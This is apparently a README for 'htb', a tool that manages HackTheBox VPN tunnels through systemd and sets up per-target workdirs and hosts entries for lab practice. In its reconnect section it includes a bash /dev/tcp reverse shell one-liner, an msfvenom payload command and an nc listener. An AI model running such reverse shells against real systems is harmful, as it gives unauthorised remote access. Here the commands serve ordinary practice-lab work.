# htb

Seamless HackTheBox VPN + target management for a Parrot/Kali VM. Manages
OpenVPN tunnels through systemd (auto-reconnect and logging for free) and sets
up per-box working state with a single command.

Two files:

- `htb.py` — the CLI (Typer + Rich, PEP 723 header).
- `htb.sh` — a thin shell shim that provides the `htb` function. Required,
  because `up`/`switch`/`target` need to change your **current** shell
  (export `$LHOST`/`$TARGET`, `cd` into the box workdir), which a child
  process can't do on its own.

## Requirements

- `openvpn` — provides the `openvpn-client@.service` systemd template.
- `sudo` — root is needed for `systemctl`, copying the config, and editing
  `/etc/hosts`.

## Install

Run inside the VM:

```bash
# directories
mkdir -p ~/.local/bin ~/.local/share/htb ~/htb-vpns

# the CLI
cp htb.py ~/.local/bin/htb.py
chmod +x ~/.local/bin/htb.py

# the shell shim
cp htb.sh ~/.local/share/htb/htb.sh

# load it from your shell rc (use ~/.zshrc if you run zsh)
echo 'source ~/.local/share/htb/htb.sh' >> ~/.bashrc

# make sure the openvpn systemd template is present
sudo apt install -y openvpn

# reload the shell so the `htb` function + tab completion are available
exec $SHELL
```

> If you put `htb.py` somewhere other than `~/.local/bin/htb.py`, set
> `HTB_PY=/your/path/htb.py` before sourcing `htb.sh`.

## Add your profiles

Drop your HackTheBox `.ovpn` files into `~/htb-vpns/`. The filename stem is the
profile name:

```
~/htb-vpns/lab_free.ovpn   ->  htb up lab_free
~/htb-vpns/release.ovpn    ->  htb up release
```

A good next step is to keep this folder on your macOS host and mount it into the
VM via UTM's shared-directory support, so new profiles downloaded on the host
appear in the VM with no copying.

## Usage

```bash
htb list                       # list available profiles
htb up [profile]               # connect (profile optional if only one exists); sets $LHOST
htb up [profile] --split       # connect, but keep normal traffic off the VPN
htb status                     # tunnel state, profile and tun IP
lhost                          # print the current tun IP (live); use $(lhost) in payloads
htb switch <profile>           # down + up in one step
htb switch <profile> --split   # switch, split-tunnelled
htb down                       # tear the tunnel down
htb target <ip> <name>         # add <name>.htb to /etc/hosts, make ~/htb/<name>/{nmap,loot,notes}, cd in, set $TARGET
htb untarget <name>            # remove that hosts entry (workdir is kept)
```

Example session:

```bash
htb up lab_free                # $LHOST now holds your tun IP
htb target 10.10.11.42 keeper  # cd ~/htb/keeper, $TARGET=10.10.11.42, keeper.htb resolves
```

## Split tunnelling (`--split`)

HTB `.ovpn` profiles pull in `redirect-gateway`, which routes **all** of the
VM's traffic through the tunnel. In a dedicated lab VM that's usually fine. If
you'd rather keep normal browsing off the VPN and only send lab traffic through
it:

```bash
htb up release --split
htb switch release --split
```

In split mode the config copied to `/etc/openvpn/client` has any local
`redirect-gateway` lines commented out and gains
`pull-filter ignore "redirect-gateway"`, so a server-pushed redirect is dropped
too. The server's pushed lab-subnet routes (the `10.10.x.x` networks) still get
installed, so the boxes stay reachable while your default route stays on your
normal interface.

Notes:

- The flag only affects the copy under `/etc/openvpn/client` — your
  `~/htb-vpns` source file is never touched.
- The config is rewritten on every `up`, so simply omitting `--split` on the
  next connect returns you to full-tunnel. There's no separate "unsplit"
  command.

## Reconnects and changing IPs

Two addresses drift during an engagement, and they're handled separately:

- **The target box IP** (after you release/re-spawn a box) — just re-run
  `htb target <newip> <name>`. The hosts entry for that name (or IP) is
  replaced, so there's no stale duplicate. A plain *reset* on HTB usually keeps
  the same IP, so you often don't need to do anything.
- **Your tun IP / `$LHOST`** (after the VPN reconnects and OpenVPN hands you a
  new address) — the `$LHOST` exported at connect time is a snapshot and goes
  stale. Use **`$(lhost)`** in payloads and listeners instead:

  ```bash
  nc -lvnp 4444                       # listener binds all interfaces, fine
  msfvenom ... LHOST=$(lhost) LPORT=4444 -f elf -o shell.elf
  # reverse shell one-liner:
  bash -i >& /dev/tcp/$(lhost)/4444 0>&1
  ```

  `lhost` re-reads the interface every call, so it's always current even if the
  tunnel bounced while you were away. (`$LHOST` stays around for convenience
  when you're typing interactively and haven't reconnected.)

The tunnel itself auto-reconnects via systemd's restart-on-failure. If you want
a hard guarantee against silent drops, a one-minute gateway health-check timer
can be added later — ask if you reach that point.

## Notes

- **Always drive this through the `htb` function, not `python3 htb.py`
  directly.** The function captures the `export`/`cd` lines on stdout and evals
  them; all human-readable output goes to stderr. Running the script directly
  works but cannot set `$LHOST`/`$TARGET` or `cd` you anywhere.
- **systemd-managed tunnel** — you get auto-reconnect and logs via
  `journalctl -u openvpn-client@htb-<profile>`. On a failed connect, `up` prints
  the last journal lines for you.
- **One connection enforced** — `up`/`switch` stop any other `htb-*` tunnel
  first, matching HackTheBox's one-VPN-per-user rule.
- **`/etc/hosts` edits live in a managed block**, so `untarget` cleans up
  precisely without touching the rest of the file. `down` does **not** clear
  hosts entries — use `untarget`.
- **`auth-user-pass`** — if a profile asks for credentials with no file,
  systemd can't prompt; point it at a `0600` creds file
  (`auth-user-pass /etc/openvpn/client/htb.auth`).

## Uninstall

```bash
rm ~/.local/bin/htb.py ~/.local/share/htb/htb.sh
# remove the `source ~/.local/share/htb/htb.sh` line from your ~/.bashrc or ~/.zshrc
# optionally: sudo rm /etc/openvpn/client/htb-*.conf
# and delete the "# >>> htb targets >>>" block from /etc/hosts
```
